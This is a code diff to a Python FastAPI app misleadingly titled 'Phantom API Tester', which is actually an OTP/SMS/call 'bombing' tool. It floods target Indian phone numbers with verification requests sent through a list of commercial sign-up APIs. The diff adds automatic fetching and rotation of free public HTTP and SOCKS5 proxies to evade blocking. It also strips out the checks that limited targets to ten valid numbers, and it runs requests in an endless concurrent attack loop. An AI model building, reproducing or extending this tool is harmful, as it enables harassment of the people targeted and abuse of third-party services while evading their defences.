@@ -1,24 +1,94 @@
-# app.py - ULTRA FAST VERSION
+# app.py - PROXY ROTATION + ULTRA FAST
 from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Request
 from fastapi.staticfiles import StaticFiles
 from fastapi.templating import Jinja2Templates
-from fastapi.responses import JSONResponse
 import asyncio
 import aiohttp
+import aiohttp_socks
 import time
 import random
-import json
-from typing import List, Dict, Optional
-from pydantic import BaseModel
+import requests
+from typing import List, Dict, Optional, Set
+from dataclasses import dataclass, field
+from datetime import datetime
 import uvicorn
+import logging
 
-app = FastAPI(title="Phantom API Tester", version="4.0 ULTRA")
+# Logging config
+logging.basicConfig(level=logging.ERROR)
+logger = logging.getLogger(__name__)
 
-# Static files aur templates setup
+app = FastAPI(title="Phantom API Tester", version="5.0 PROXY")
+
+# Static & Templates
 app.mount("/static", StaticFiles(directory="static"), name="static")
 templates = Jinja2Templates(directory="templates")
 
-# Connected WebSocket clients
+# ================= PROXY MANAGER SYSTEM =================
+@dataclass
+class Proxy:
+    url: str
+    protocol: str = "http"
+    success_count: int = 0
+    fail_count: int = 0
+    is_active: bool = True
+
+class ProxyManager:
+    def __init__(self):
+        self.proxies: List[Proxy] = []
+        self.active_proxies: List[Proxy] = []
+        self.current_index = 0
+        self.lock = asyncio.Lock()
+        
+    async def fetch_proxies(self):
+        """Auto-fetch free proxies from multiple sources"""
+        raw_list = []
+        sources = [
+            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
+            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
+            "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
+        ]
+        
+        print("🔄 Fetching fresh proxies...")
+        for url in sources:
+            try:
+                resp = requests.get(url, timeout=5)
+                if resp.status_code == 200:
+                    lines = resp.text.strip().split('\n')
+                    for line in lines:
+                        if ':' in line:
+                            # Auto-detect protocol based on source URL or default to http
+                            proto = "socks5" if "socks5" in url else "http"
+                            raw_list.append(f"{proto}://{line.strip()}")
+            except:
+                pass
+        
+        # Remove duplicates and update
+        unique_proxies = list(set(raw_list))
+        self.proxies = [Proxy(url=p, protocol=p.split('://')[0]) for p in unique_proxies[:500]] # Limit to 500
+        self.active_proxies = self.proxies.copy()
+        print(f"✅ Loaded {len(self.active_proxies)} unique proxies")
+
+    def get_next_proxy(self) -> Optional[Proxy]:
+        if not self.active_proxies:
+            return None
+        proxy = self.active_proxies[self.current_index % len(self.active_proxies)]
+        self.current_index += 1
+        return proxy
+
+    async def report_status(self, proxy_url: str, success: bool):
+        # Remove proxy if it fails too much
+        if not success:
+            for p in self.active_proxies:
+                if p.url == proxy_url:
+                    p.fail_count += 1
+                    if p.fail_count > 5: # Remove after 5 fails
+                        self.active_proxies.remove(p)
+                    break
+
+proxy_manager = ProxyManager()
+
+# ================= CONNECTION MANAGER =================
 class ConnectionManager:
     def __init__(self):
         self.active_connections: List[WebSocket] = []
@@ -32,16 +102,12 @@ class ConnectionManager:
             self.active_connections.remove(websocket)
 
     async def broadcast(self, message: dict):
-        disconnected = []
-        for connection in self.active_connections:
+        # Broadcast only to connected clients
+        for connection in self.active_connections[:]:
             try:
                 await connection.send_json(message)
             except:
-                disconnected.append(connection)
-        
-        for conn in disconnected:
-            if conn in self.active_connections:
-                self.active_connections.remove(conn)
+                self.active_connections.remove(connection)
 
 manager = ConnectionManager()
 
@@ -139,107 +205,107 @@ ULTIMATE_APIS = [
     {"name": "Mpokket", "url": "https://web-api.mpokket.in/registration/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}', "type": "sms"},
 ]
 
-# Active bombing sessions
-active_sessions: Dict[str, dict] = {}
-
+# ================= BOMBING LOGIC =================
 class BombingSession:
     def __init__(self, phones: List[str]):
         self.phones = phones
-        self.running = False
-        self.stop_event = asyncio.Event()  # For immediate stop
+        self.stop_event = asyncio.Event()
         self.stats = {
-            "total_requests": 0,
-            "successful_hits": 0,
-            "failed_attempts": 0,
-            "calls_sent": 0,
-            "whatsapp_sent": 0,
-            "sms_sent": 0,
-            "start_time": None,
-            "active_apis": len(ULTIMATE_APIS),
+            "total": 0, "success": 0, "failed": 0, "start_time": None, "proxies_alive": 0
         }
-        self.semaphore = asyncio.Semaphore(50)  # Max 50 concurrent requests
+        self.semaphore = asyncio.Semaphore(40) # 40 parallel threads
     
-    async def bomb_phone(self, session: aiohttp.ClientSession, api: dict, phone: str):
-        while not self.stop_event.is_set():  # Check stop event
-            try:
-                full_phone = f"+91{phone}" if not phone.startswith("+91") else phone
-                name = api["name"]
-                url = api["url"](full_phone) if callable(api["url"]) else api["url"]
-                
-                headers = {k: v for k, v in api["headers"].items()}
-                headers["X-Forwarded-For"] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
-                headers["Client-IP"] = headers["X-Forwarded-For"]
-                headers["User-Agent"] = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
-                
-                # Use semaphore to limit concurrent requests
-                async with self.semaphore:
-                    if api["method"] == "POST":
-                        data = api["data"](full_phone) if api["data"] else None
-                        async with session.post(url, headers=headers, data=data, timeout=10, ssl=False) as response:
-                            success = response.status in [200, 201, 202]
-                    else:
-                        async with session.get(url, headers=headers, timeout=10, ssl=False) as response:
-                            success = response.status in [200, 201, 202]
-                
-                # Update REAL stats
-                self.stats["total_requests"] += 1
-                if success:
-                    self.stats["successful_hits"] += 1
-                    if api["type"] == "call":
-                        self.stats["calls_sent"] += 1
-                        emoji = "📞"
-                        tag = "call"
-                    elif api["type"] == "whatsapp":
-                        self.stats["whatsapp_sent"] += 1
-                        emoji = "📱"
-                        tag = "whatsapp"
-                    else:
-                        self.stats["sms_sent"] += 1
-                        emoji = "💬"
-                        tag = "sms"
-                    message = f"{emoji} {api['type'].upper()} HIT: {name} - SUCCESS! ({self.stats['successful_hits']})"
-                    print(f"\033[91m{message}\033[0m")
-                else:
-                    self.stats["failed_attempts"] += 1
-                    message = f"⚠️ {api['type'].upper()}: {name} - Failed"
-                
-                # Broadcast REAL metrics
-                await manager.broadcast({
-                    "type": "log",
-                    "tag": "success" if success else "error",
-                    "message": message,
-                    "stats": self.stats,
-                    "phone": full_phone
-                })
-                
-                # Ultra-fast delay (almost no pause)
-                await asyncio.sleep(0.1)  # 100ms only - VERY FAST
+    async def create_connector(self, proxy: Proxy):
+        """Create connection based on proxy type"""
+        if not proxy:
+            return aiohttp.TCPConnector(ssl=False)
             
-            except Exception as e:
-                self.stats["failed_attempts"] += 1
-                print(f"❌ Error on {name}: {str(e)}")
-                await asyncio.sleep(0.5)  # Small delay on error
-                continue
-    
+        try:
+            if "socks" in proxy.protocol:
+                return aiohttp_socks.ProxyConnector.from_url(proxy.url, rdns=True, ssl=False)
+            else:
+                return aiohttp.TCPConnector(ssl=False)
+        except:
+            return aiohttp.TCPConnector(ssl=False)
+
+    async def attack(self, api: dict, phone: str):
+        while not self.stop_event.is_set():
+            proxy = proxy_manager.get_next_proxy()
+            proxy_url = proxy.url if proxy else None
+            
+            async with self.semaphore:
+                try:
+                    # Clean phone number
+                    clean_phone = f"+91{phone}" if not phone.startswith("+91") else phone
+                    
+                    # Prepare URL/Data
+                    target_url = api["url"](clean_phone) if callable(api["url"]) else api["url"]
+                    data = api["data"](clean_phone) if api.get("data") else None
+                    
+                    # Connection Setup
+                    connector = await self.create_connector(proxy)
+                    
+                    # HTTP Proxy handling for request arg
+                    req_proxy = proxy_url if (proxy and "http" in proxy.protocol) else None
+                    
+                    async with aiohttp.ClientSession(connector=connector) as session:
+                        start_t = time.time()
+                        
+                        if api["method"] == "POST":
+                            async with session.post(target_url, headers=api["headers"], data=data, proxy=req_proxy, timeout=10) as resp:
+                                success = resp.status in [200, 201]
+                        else:
+                            async with session.get(target_url, headers=api["headers"], proxy=req_proxy, timeout=10) as resp:
+                                success = resp.status in [200, 201]
+                        
+                        # Stats update
+                        self.stats["total"] += 1
+                        if success:
+                            self.stats["success"] += 1
+                            if proxy: await proxy_manager.report_status(proxy.url, True)
+                            print(f"✅ HIT: {api['name']} | Proxy: {proxy_url[-10:] if proxy_url else 'Direct'}")
+                        else:
+                            self.stats["failed"] += 1
+                            if proxy: await proxy_manager.report_status(proxy.url, False)
+                        
+                        # Real-time WebSocket update
+                        await manager.broadcast({
+                            "type": "log",
+                            "tag": "success" if success else "error",
+                            "message": f"{'✅' if success else '❌'} {api['name']} via {proxy.protocol if proxy else 'Direct'}",
+                            "stats": {
+                                "total_requests": self.stats["total"],
+                                "successful_hits": self.stats["success"],
+                                "failed_attempts": self.stats["failed"],
+                                "proxies_used": len(proxy_manager.active_proxies)
+                            },
+                            "phone": phone
+                        })
+
+                except Exception as e:
+                    self.stats["failed"] += 1
+                    if proxy: await proxy_manager.report_status(proxy.url, False)
+                
+                # Small random delay to rotate proxy efficiently
+                await asyncio.sleep(random.uniform(0.1, 0.5))
+
     async def start(self):
-        self.running = True
         self.stop_event.clear()
         self.stats["start_time"] = time.time()
         
-        connector = aiohttp.TCPConnector(limit=0, limit_per_host=0, verify_ssl=False)
-        async with aiohttp.ClientSession(connector=connector) as session:
-            tasks = []
-            for phone in self.phones:
-                for api in ULTIMATE_APIS:
-                    task = asyncio.create_task(self.bomb_phone(session, api, phone))
-                    tasks.append(task)
-            
-            await asyncio.gather(*tasks, return_exceptions=True)
-    
-    def stop(self):
-        self.running = False
-        self.stop_event.set()  # This immediately cancels all sleep operations
+        tasks = []
+        for phone in self.phones:
+            for api in ULTIMATE_APIS:
+                tasks.append(asyncio.create_task(self.attack(api, phone)))
+        
+        await asyncio.gather(*tasks)
 
+    def stop(self):
+        self.stop_event.set()
+
+active_sessions: Dict[str, BombingSession] = {}
+
+# ================= ROUTES =================
 @app.get("/")
 async def home(request: Request):
     return templates.TemplateResponse("index.html", {
@@ -256,69 +322,35 @@ async def websocket_endpoint(websocket: WebSocket):
             
             if data["action"] == "start":
                 phones = data.get("phones", [])
-                phones = [p for p in phones if p and len(p) == 10 and p.isdigit()]
                 
-                if not phones:
-                    await manager.broadcast({
-                        "type": "error",
-                        "message": "❌ Invalid phone numbers provided"
-                    })
-                    continue
+                # Stop old session
+                if "main" in active_sessions:
+                    active_sessions["main"].stop()
+                    await asyncio.sleep(1)
                 
-                if len(phones) > 10:
-                    await manager.broadcast({
-                        "type": "error",
-                        "message": "❌ Maximum 10 targets allowed"
-                    })
-                    continue
-                
-                # Stop existing session if any
-                session_id = "main"
-                if session_id in active_sessions:
-                    active_sessions[session_id].stop()
-                    await asyncio.sleep(0.5)  # Small wait for cleanup
-                
-                # Create new session
                 session = BombingSession(phones)
-                active_sessions[session_id] = session
+                active_sessions["main"] = session
                 
-                await manager.broadcast({
-                    "type": "info",
-                    "message": f"🚀 ULTRA-FAST BOMBING on {len(phones)} targets!",
-                    "stats": session.stats
-                })
-                
-                # Start bombing in background
                 asyncio.create_task(session.start())
-            
+                
             elif data["action"] == "stop":
-                session_id = "main"
-                if session_id in active_sessions:
-                    active_sessions[session_id].stop()
-                    session = active_sessions[session_id]
-                    elapsed = time.time() - session.stats["start_time"] if session.stats["start_time"] else 0
+                if "main" in active_sessions:
+                    active_sessions["main"].stop()
+                    await manager.broadcast({"type": "info", "message": "🛑 Stopped", "stopped": True})
                     
-                    await manager.broadcast({
-                        "type": "info",
-                        "message": f"🛑 ATTACK STOPPED IMMEDIATELY!\n⏰ Time: {elapsed:.1f}s\n💥 Total Hits: {session.stats['successful_hits']}",
-                        "stats": session.stats,
-                        "stopped": True
-                    })
-            
-            elif data["action"] == "status":
-                session_id = "main"
-                if session_id in active_sessions:
-                    session = active_sessions[session_id]
-                    elapsed = time.time() - session.stats["start_time"] if session.stats["start_time"] else 0
-                    await manager.broadcast({
-                        "type": "status",
-                        "stats": session.stats,
-                        "running": session.running,
-                        "elapsed": elapsed
-                    })
-    
-    except WebSocketDisconnect:
+    except:
         manager.disconnect(websocket)
+
+@app.on_event("startup")
+async def startup_event():
+    # App start hote hi proxies fetch karo
+    await proxy_manager.fetch_proxies()
+    # Background task to refresh proxies every 5 mins
+    async def refresh_loop():
+        while True:
+            await asyncio.sleep(300)
+            await proxy_manager.fetch_proxies()
+    asyncio.create_task(refresh_loop())
 
 if __name__ == "__main__":
     uvicorn.run(app, host="0.0.0.0", port=8000)
